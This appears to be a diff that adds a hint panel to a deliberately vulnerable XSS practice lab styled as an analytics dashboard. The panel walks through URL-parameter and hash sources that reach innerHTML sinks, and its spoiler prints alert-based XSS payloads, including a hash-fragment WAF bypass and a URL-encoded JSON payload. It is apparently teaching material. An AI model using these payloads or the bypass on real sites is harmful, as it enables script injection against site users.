@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Metrica - Analytics Dashboard</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { font-family: 'Inter', -apple-system, sans-serif; background: #0f0f12; color: #e4e4e7; }
@@ -405,6 +406,82 @@
     window.addEventListener('hashchange', function(){
       processDeepLinks();
     });
+
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
   </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: Metrica Source → Sink Hunt</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The deep-link module processes many URL params and hash fragments. Two paths end in innerHTML sinks. One is trivial, one is a little hidden.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">1</div><span>Find processDeepLinks</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Read the inline script. <code>processDeepLinks</code> reads: <code>tab</code>, <code>highlight</code>, <code>widget</code>, <code>notify</code>, <code>view</code>, <code>title</code>, <code>content</code> from URL query and hash.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">2</div><span>Sink 1: notify → showBanner</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>showBanner(message)</code> does <code>banner.innerHTML = '&lt;span&gt;' + message + '&lt;/span&gt;...'</code>. Payload: <code>?notify=&lt;img src=x onerror=alert(1)&gt;</code>
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">3</div><span>Sink 2: view=custom → renderCustomView</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          When <code>view === 'custom'</code>, <code>renderCustomView(title, content)</code> does <code>customDiv.innerHTML = '...' + title + '...' + content + '...'</code>. Both title and content are injectable.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">4</div><span>Sink 3: widget JSON with customCSS</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>widget</code> param is JSON (or base64 JSON). <code>applyWidgetConfig</code> uses <code>customCSS</code> via <code>style.textContent</code> &mdash; CSS injection only, not XSS. But <code>announcement</code> in the JSON calls <code>showBanner</code> (innerHTML sink).
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">5</div><span>Hash vs query</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>processDeepLinks</code> reads BOTH <code>URLSearchParams</code> and hash params. Hash version bypasses any server-side WAF and works with <code>hashchange</code> runtime triggering.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 All Solutions</button>
+        <div class="hint-spoiler-content">
+          <p><strong>Easiest (notify):</strong></p>
+          <pre>?notify=&lt;img src=x onerror=alert(1)&gt;</pre>
+          <p><strong>Custom view:</strong></p>
+          <pre>?view=custom&amp;content=&lt;img src=x onerror=alert(2)&gt;</pre>
+          <p><strong>Hash variant (WAF bypass):</strong></p>
+          <pre>#notify=&lt;img src=x onerror=alert(3)&gt;</pre>
+          <p><strong>Widget JSON with announcement:</strong></p>
+          <pre>?widget=%7B%22announcement%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(4)%3E%22%7D</pre>
+        </div>
+      </div>
+    </div>
+  </div>
 </body>
 </html>
